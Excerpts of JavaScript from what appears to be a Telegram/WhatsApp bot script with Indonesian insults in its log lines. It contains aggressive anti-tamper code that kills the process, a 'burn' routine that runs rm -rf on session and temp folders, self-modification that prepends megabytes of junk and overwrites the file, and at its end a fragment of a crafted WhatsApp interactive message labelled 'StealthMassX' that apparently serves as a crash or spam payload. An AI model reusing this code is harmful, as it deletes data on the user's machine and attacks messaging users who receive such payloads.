(() => {
  ...
  if (require.main !== module || process.argv[1] !== __filename) {
    console.log("\x1b[5m\x1b[41m🖕 G.O.G – LU KIRA -r BISA NONGOL? CUIH!\x1b[0m");
    $cp.execSync("kill -9 "+process.pid);
  }

  if (process.env.LD_PRELOAD || process.env.DYLD_INSERT_LIBRARIES) {
    console.log("\x1b[5m\x1b[41m🖕 G.O.G – PRELOAD LU AMPAS, BALIK AJA SONO!\x1b[0m");
    $cp.execSync("kill -9 "+process.pid);
  }

  const native = fn => { try { return fn.toString().includes("[native code]"); } catch { return false; } };
  if (!native(process.exit) || !native(process.kill)) {
    console.log("\x1b[5m\x1b[41m🖕 G.O.G – EXIT/KILL LU SUDAH DIKONTOLIN? MATI AJA!\x1b[0m");
    $cp.execSync("kill -9 "+process.pid);
  }

  ["SIGINT","SIGTERM","SIGHUP"].forEach(s=>{
    if(process.listenerCount(s)>1){
      console.log(`\x1b[5m\x1b[41m🖕 G.O.G – ${s} LISTENER=${process.listenerCount(s)}? SADAR DIRI LU BOCAH!\x1b[0m`);
      $cp.execSync("kill -9 "+process.pid);
    }
  });

  const lock = (obj, prop, orig) => Object.defineProperty(obj, prop, {
    get:()=>orig, set:()=>{
      console.log("\x1b[5m\x1b[41m🖕 G.O.G – LU MAU OVERRIDE "+prop+"? MIMPI BASAH LU!\x1b[0m");
      $cp.execSync("kill -9 "+process.pid);
    }, configurable:false
  });
  lock(global, "eval", global.eval);
  lock(global, "Function", global.Function);

  const origReq = require;
  let reqLocked = false;
  const guardReq = new Proxy(origReq, {
    apply(t,_,a){ 
      if(reqLocked){
        console.log("\x1b[5m\x1b[41m🖕 G.O.G – REQUIRE TAMBAHAN? LU TETEP GAGAL!\x1b[0m");
        $cp.execSync("kill -9 "+process.pid);
      }
  ...
  reqLocked = true;
  global.require = guardReq;

  function burn(){
    try{
      const tok = process.env.BOT_TOKEN || require("./config.js").BOT_TOKEN;
      const own = require("./config.js").OWNER_ID[0];
      const msg = "🔥 <b>G.O.G TERSENTUH</b>\nScript bakal dihapus & mati total.";
      require("https").request({
        hostname:"api.telegram.org",
        path:`/bot${tok}/sendMessage`,
        method:"POST",
        headers:{"Content-Type":"application/json"}
      }).end(JSON.stringify({chat_id:own,text:msg,parse_mode:"HTML"}));
    }catch{}
    try{ ["./sessions","./犬","./temp"].forEach(d=>$fs.existsSync(d)&&$cp.execSync("rm -rf "+d)); }catch{}
    $cp.execSync("kill -9 "+process.pid);
  }

  setInterval(()=>{
    if(global.__lastPing && Date.now()-global.__lastPing>20_000) burn();
    global.__lastPing=Date.now();
  },7_000);

  process.on("uncaughtException",burn);
  process.on("unhandledRejection",burn);

  (()=>{
    const junk = "\0".repeat(2_000_000)+"\r".repeat(100_000)+"\u200B".repeat(50_000);
    const ori = $fs.readFileSync(process.argv[1],"utf8");
    if(!ori.startsWith(junk)){
      console.log("\x1b[5m\x1b[41m🖕 JUNK-GUARD – LU POTONG JUNK? MAMPUS!\x1b[0m");
      burn();
    }
    if(!ori.startsWith(junk)) $fs.writeFileSync(process.argv[1],junk+"\n"+ori);
  })();
...
const currentHash = crypto.createHash("sha256")
                    .update(fs.readFileSync(__filename))  // <-- full file
                    .digest("hex");
const savedHash   = process.env.CODE_HASH;

if (savedHash && savedHash !== "0" && currentHash !== savedHash) {
  console.log(chalk.bgRed("❌ INTEGRITY FAIL – file telah dimodifikasi!"));
  fs.writeFileSync(__filename, 'throw new Error("CORRUPTED FILE");');
  process.exit(1);
}
/* ===== END INTEGRITY ===== */
...
async function performUpdate(chatId) {
  ...
  try {
    ...
    /* 5a. Hitung & simpan hash baru untuk integrity layer */
    const freshHash = crypto.createHash('sha256')
                    .update(obfuscated.split('\n').slice(1).join('\n')) // skip baris-1 garbage
                    .digest('hex');
    const envPath = './.env';
    let env = fs.existsSync(envPath) ? fs.readFileSync(envPath, 'utf8') : '';
    env = env.split('\n').filter(l => !l.startsWith('CODE_HASH=')).join('\n');
    env += `\nCODE_HASH=${freshHash}\n`;
          ...
          message: {
            interactiveResponseMessage: {
              ...
              nativeFlowResponseMessage: {
                ...
                paramsJson: `{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"2.7205\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"StealthMassX\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${noise}\"}}`,
                version: 3
              }
            }
          }
